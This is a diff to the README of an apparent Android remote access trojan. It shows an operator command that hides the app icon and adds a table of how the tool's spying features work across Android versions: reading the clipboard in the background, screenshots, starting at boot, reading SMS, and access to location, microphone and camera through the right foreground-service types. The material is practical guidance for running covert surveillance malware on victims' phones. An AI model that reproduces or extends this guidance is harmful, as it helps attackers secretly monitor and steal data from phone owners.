@@ -62,6 +62,21 @@ hackit rat send <sid> hide_icon on
 `screenshot` needs a MediaProjection consent — open the setup page once and
 tap *Screen capture consent*; consent is per-projection on Android 14+.
 
+## Version behaviour
+
+| area | 5–9 | 10–12 | 13–15 |
+|---|---|---|---|
+| permissions | install-time | runtime dialog | runtime dialog, notification prompt on 13+ |
+| foreground service | plain start | `dataSync` type required on 14+ | types only while-in-use unless background location granted |
+| clipboard | readable in background | foreground/IME only | same as 10 |
+| screenshot | MediaProjection | MediaProjection | consent per capture, FGS `mediaProjection` type |
+| boot start | works | works | works, battery optimisation exemption advised |
+| SMS | read via permission | same | same (default-SMS role not required) |
+
+The service asks for `location` only when background location is granted (or
+the app is focused), and adds `microphone`/`camera` only when focused — which
+is what Android 14+ demands and what keeps the start from throwing.
+
 ## Layout
 
 ```
